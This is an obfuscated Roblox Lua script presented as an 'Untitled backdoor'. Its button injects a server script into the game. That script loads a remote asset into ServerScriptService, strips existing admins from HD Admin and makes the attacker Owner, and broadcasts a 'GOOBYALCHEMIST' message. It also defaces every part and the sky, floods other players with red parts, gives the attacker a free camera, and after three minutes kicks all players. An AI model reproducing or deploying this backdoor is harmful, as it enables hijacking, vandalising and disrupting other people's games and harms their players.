pcall(function()
local a,b,c=game:GetService("Players"),game:GetService("ServerScriptService"),game:GetService("ReplicatedStorage")
local d=Instance.new("ScreenGui")d.Name=string.char(120,85,73)d.Parent=a.LocalPlayer:WaitForChild("PlayerGui")
local e=Instance.new("Frame",d)e.Size=UDim2.new(0,300,0,150)e.Position=UDim2.new(0.5,-150,0.5,-75)
e.BackgroundColor3=Color3.fromRGB(20,20,20)e.BorderSizePixel=0e.AnchorPoint=Vector2.new(0.5,0.5)
local f=Instance.new("ImageLabel",e)f.Size=UDim2.new(0,60,0,60)f.Position=UDim2.new(0,10,0,10)
f.BackgroundTransparency=1f.Image="rbxassetid://90188826577714"
local g=Instance.new("TextLabel",e)g.Size=UDim2.new(1,-80,0,60)g.Position=UDim2.new(0,80,0,10)
g.BackgroundTransparency=1g.TextColor3=Color3.fromRGB(255,255,255)g.Font=Enum.Font.GothamBold
g.TextSize=24g.Text=string.reverse("roodkcab deltitnU")g.TextXAlignment=Enum.TextXAlignment.Left
local h=Instance.new("TextButton",e)h.Size=UDim2.new(1,-20,0,40)h.Position=UDim2.new(0,10,1,-50)
h.BackgroundColor3=Color3.fromRGB(40,40,40)h.BorderSizePixel=0h.Font=Enum.Font.GothamBold
h.TextSize=20h.TextColor3=Color3.fromRGB(255,0,0)h.Text=string.reverse("roodkcab deltitnU")h.AutoButtonColor=true
h.MouseButton1Click:Connect(function()
if b:FindFirstChild("xBD")then return end
local i=Instance.new("Script")i.Name="xBD"i.Parent=b
i.Source=[[
local A,B,C=game:GetService("Players"),game:GetService("InsertService"),game:GetService("ServerStorage")
local D,E,F=game:GetService("Lighting"),game:GetService("StarterPlayer").StarterPlayerScripts,857927023
local G,H="rbxassetid://90188826577714","rbxassetid://678930213"
pcall(function()local a=B:LoadAsset(F)if a then a.Parent=workspace local b=a:FindFirstChildOfClass("Folder")
if b then b.Parent=game.ServerScriptService end end end)
local I repeat wait(1)I=C:FindFirstChild("HDAdminSettings")until I
local J=require(I.Settings.Ranks)for _,v in pairs(J)do if v.Users and v.Level>=200 then for i=#v.Users,1,-1 do table.remove(v.Users,i)end end end
local K A.PlayerAdded:Connect(function(p)if not K then K=p.Name if not J.Owner then J.Owner={Level=255,Users={}}end table.insert(J.Owner.Users,p.Name)end end)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("ALL HAIL GUYS GOOBYALCHEMIST","All")
local L=Instance.new("Sky")for _,f in ipairs({"Bk","Dn","Ft","Lf","Rt","Up"})do L["Skybox"..f]=G end D.Sky=L
for _,x in pairs(workspace:GetDescendants())do if x:IsA("BasePart")then x.Material=Enum.Material.ForceField x.Color=Color3.new(0,0,0)
for _,c in pairs(x:GetChildren())do if c:IsA("Decal")then c:Destroy()end end
local d=Instance.new("Decal",x)d.Texture=G d.Face=Enum.NormalId.Front end end
spawn(function()local m=tick()+180 while tick()<m do for _,p in pairs(A:GetPlayers())do
if p.Name~=K and p.Character and p.Character.PrimaryPart then
for i=1,20 do local q=Instance.new("Part",workspace)q.Size=Vector3.new(1,1,1)q.Anchored=true q.CanCollide=false
q.CFrame=p.Character.PrimaryPart.CFrame*CFrame.new(math.random(-50,50),math.random(-50,50),math.random(-50,50))
q.Material=Enum.Material.Neon q.BrickColor=BrickColor.new("Really red")end end end wait(0.05)end end)
local n=Instance.new("LocalScript")n.Name="xCam"n.Parent=E
n.Source=[[
local a=game:GetService("Players")local b=game:GetService("UserInputService")local c=game:GetService("RunService")
local d=a.LocalPlayer if not(require(game.ServerStorage.HDAdminSettings.Settings.Ranks).Owner.Users[1]==d.Name)then return end
local e=workspace.CurrentCamera e.CameraType=Enum.CameraType.Scriptable local f=Vector3.new()local g=100
b.InputBegan:Connect(function(i,h)if h then return end if i.KeyCode==Enum.KeyCode.W then f+=e.CFrame.LookVector
elseif i.KeyCode==Enum.KeyCode.S then f-=e.CFrame.LookVector elseif i.KeyCode==Enum.KeyCode.A then f-=e.CFrame.RightVector
elseif i.KeyCode==Enum.KeyCode.D then f+=e.CFrame.RightVector end end)
b.InputEnded:Connect(function(i)if i.KeyCode==Enum.KeyCode.W or i.KeyCode==Enum.KeyCode.S or i.KeyCode==Enum.KeyCode.A or i.KeyCode==Enum.KeyCode.D then f=Vector3.new()end end)
c.RenderStepped:Connect(function(dt)if f.Magnitude>0 then e.CFrame=e.CFrame+f.Unit*g*dt end end)
]]
delay(180,function()for _,x in pairs(game:GetService("Players"):GetPlayers())do x:Kick("GOOBYALCHEMIST")end end)
]]
end)
